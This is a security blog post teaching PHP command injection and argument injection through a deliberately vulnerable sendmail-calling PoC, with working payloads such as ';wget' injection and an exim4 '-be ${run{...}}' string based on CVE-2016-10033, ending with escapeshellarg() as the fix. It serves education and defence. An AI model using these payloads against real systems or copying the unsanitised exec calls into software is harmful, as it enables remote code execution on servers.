---
layout: post
title:  "PHP Command Injection and Argument Injection"
categories: OffensiveAppSec
tags:  CommandI
author: Alvaro Folgado (@rebujacker)
---

* content
{:toc}


![](/images/phpcommandi.png)

## Introduction

This is the first post within the category: “Theoretical Practise”. In these series I will use information available in the Internet to build a working Proof of Concept and to test dangerous functions in different languages with the objective to understand basic Web Exploitation vectors. In this chapter, I have built a Proof of Concept in relation  to the exploitation of Command Injection and Argument Injection, using PHP language. Existent PoC can be (found or obtained) [here](http://afolgado.com/poc/)

## Command Injection VS Argument Injection

Since this is the first post in which I talk about these two vulnerabilities, let  me explain in a nutshell how they work. Command Injection occurs when we provide to any kind of command interpreter as sh/bash/cmd a string directly coming from an uncontrolled user input. An example of vulnerable code is detailed as follows:


```php
popen("/usr/bin/touch ".$userInput,"r");
shell_exec("/usr/bin/touch ".$userInput);
passthru("/usr/bin/touch ".$userInput);
[...]
```

In these functions, if the user can control the $userInput string used by any of these functions, he or she could perform an a Command Injection attack as follows:

```bash
ss@email.com;wget http://127.0.0.1/test
ss@email.com|wget http://127.0.0.1/test
[...]
```

On the other hand, an Argument Injection is different; it is triggered when an attacker injects arguments/parameters to the Executable called by these functions. This situation happens when the user input is being filtered to escape only shell special characters,or is not possible to inject them, but the injection of spaces is totally possible. By using spaces, an attacker can forge a malicious string that adds arguments, parameters, or new options to the target executable, effectively amending its behaviour.
 
```php
$escapedUserInput = escapeshellcmd($userInput);

popen("/usr/bin/touch ".$userInput,"r");
shell_exec("/usr/bin/touch ".$userInput);
passthru("/usr/bin/touch ".$userInput);
[...]
```

In an Argument Injection, the ability to exploit the vulnerability depends on  the nature of the target executable. The capability to  create a successful attack vector will depend on  our knowledge of possible parameters/configurations of it. As a last resource, an attacker/we could try to create a low-level exploit in case the executable is a C binary, or to concatenate other vulnerabilies if it is a script. It all depends how deep into the rabbit hole the attacker is willing to go to exploit it.

The following bash script shows a useful way to debug Argument Injection attaks when the executable that is being employed is known / has been identified:


```bash
#!/bin/bash
cat > /tmp/outgoing-command

echo Received: $0 >> /tmp/outgoing-command
echo Received: $1 >> /tmp/outgoing-command
echo Received: $2 >> /tmp/outgoing-command
echo Received: $3 >> /tmp/outgoing-command
echo Received: $4 >> /tmp/outgoing-command
echo Received: $5 >> /tmp/outgoing-command
echo Received: $6 >> /tmp/outgoing-command
echo Received: $7 >> /tmp/outgoing-command
echo Received: $8 >> /tmp/outgoing-command
echo Received: $9 >> /tmp/outgoing-command

#... whatever more args we should like to capture
```

This will help us understand what is being passed from the side of the web app to the operating system executable. Later on we will use it to show how this PoC works.

## Proof of concept: Command Injection

The following PoC consists in a simple PHP web application that uses dangerous functions to perform a call to the sendmail/exim4 executable. The Command Injection takes place into the $emailFrom variable as the user input is not properly sanitized

```php
if (isset($_POST['emailFrom']) and isset($_POST['emailTo']) and isset($_POST['body']) and !strcmp($_POST['submit'],'Command Injection')){

	$emailTo = $_POST['emailTo'];

	$emailFrom = $_POST['emailFrom'];

	$body = $_POST['body'];

//Payload1 used here!

//Popen call pipe to the target process, is totally Command Injectable
//popen("/usr/sbin/sendmail -f".$emailFrom,"r");

//Same as Popen!
//shell_exec("/usr/sbin/sendmail -f".$emailFrom);

//Same as Popen!
//passthru("/usr/sbin/sendmail -f".$emailFrom);

//Same as Popen!
exec("/usr/sbin/sendmail -f".$emailFrom);

[...]
```

The way to test this Command Injection is very simple; we just provide the previous payloads in the “emailFrom” input and click Command Injection. By accessing to /var/log/apache2/access.log in the target PoC server, we can see that the “wget” command is being performed correctly.

In this example anything was escaped,so the payloads were obvious. Sometimes developers will try to mitigate these vulnerabilities by creating their own escaping functions. This usually introduces new errors that can be further exploited, so trying different payloads is always recommended.

Creativity and knowledge of the sh/bash/cmd software and Operating System will allow  attackers to use complex attack vectors to exploit Command Injections. A good example of this was the famous bug [CVE-2014-6271 ShellShock](https://fedoramagazine.org/shellshock-how-does-it-actually-work/). In this case, the injection took place into system environment variables which were supposed to be safe, but this last bug made it critical in some CGI servers.


## Proof of concept: Argument Injection

In the second option of the PoC we use a function accessible by PHP to escape possible dangerous shell characters that would allow  an attacker to concatenate commands. The used code is as follows:


```php
}elseif (isset($_POST['emailFrom']) and isset($_POST['emailTo']) and isset($_POST['body']) and !strcmp($_POST['submit'],'Argument Injection')) {
	
	$emailTo = $_POST['emailTo'];

	$emailFrom = escapeshellcmd($_POST['emailFrom']);

	$body = $_POST['body'];

//Payload2 used here!

popen("/usr/sbin/sendmail -f".$emailFrom,"r");

//We can try using the rest of dangerous functions here!

```

This function will escape symbols as “;|{} …”. 
But this php function will not escape spaces, the injection of them will be the key to exploiting the Argument Injection. As I  mentioned before, by analyzing the used executable, we are  able to obtain an exploitation vector. The target executable is “sendmail”, which  in most of Unix OS is a soft link to the target binary to study: “exim4”. Legal hackers has performed an outstanding study of it with, making his exploitation possible: [PHPMAILER CVE-2016-10033](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)

Coming  from the link above, “exim4” has  an argument “-be” that grants us access to run shell commands in the operating system. Basically, it is possible to run something like this in bash to test the functionality:


```bash
/usr/sbin/exim4 -be '${run{/usr/bin/id}}'
```

So at first instance, we would  think that a payload like the following would easily to the job:

```bash
ss@email.com -be '${run{/usr/bin/wget http://127.0.0.1/test}}'
```

Unfortunately, this is not going to  work. To  easily figure out what is going on, we need to  use the little bash script we mention before (commanddebugger inside the PoC) and configure the server where the PoC is running as follows:

```bash
ln -s /home/ubuntu/debugger /usr/sbin/sendmail
chmod +x /usr/sbin/sendmail
```

If we run again the previous payload, we can see at /tmp/outgoing-command in the following:

```bash
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com
Received: -be
Received: \$\{run\{/usr/bin/wget http://127.0.0.1/test\}\}
Received:
Received:
```

This is thanks to escapeshellcmd() escaping every forbidden character inside closed quotes. If we try to use the same payload without quotes we will encounter  another problem:

```bash
Payload:
ss@email.com -be ${run{/usr/bin/wget http://127.0.0.1/test}}

Debugger output:
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com
Received: -be
Received: ${run{/usr/bin/wget
Received: http://127.0.0.1/test}}
Received:
Received:
```

The space that let us performing the Argument Injection now is backfiring our ability to exploit it. An awesome study by Legal Hackers about  the target binary properties let us know that we can exploit the use of characters inside environmental variables strings of exim4 (more details in  the previous link).

```bash
Payload:
ss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}

Debugger output:
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com
Received: -be
Received: ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
Received:
Received:
```

Finally we achieve a successful Argument Injection exploitation.

## Proof of concept: 99% safe?

In the last part of this PoC we use the right escape function to avoid the exploitation of these dangerous functions: escapeshellarg(). Add single quotes around the string so that neither spaces or any special bash symbols are interpreted by shell/bash.

```bash
Payload:
ss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}

Debugger output:
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
Received:
```

As we can see spaces are no longer  effective; we can trust that our dangerous functions are as secure as possible.

## Conclusions

In an **attacker** perspective, if we see data that could be passed as a string to a dangerous function like the following URL:

```js
http://example.com/action?ping=<IP-STRING>
```

We should try a series  of command Injection Payloads for a linux/windows based operating system and check  if our external server has been reached. Argument Injection is much trickier. For that, we will need to figure out vulnerable 3PP (third party library software) used by the target web application.

From a defensive point of view, it is critical to escape any input that goes into dangerous functions. Defender should avoid abusing these functions to perform the application logic, but if he uses it, he should be very  careful. The Dangerous Functions that I know so far will be listed [here](http://afolgado.com/researchguide/)

## References

[PHPMAILER CVE-2016-10033](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)

[OWASP](https://www.owasp.org/index.php/Main_Page)

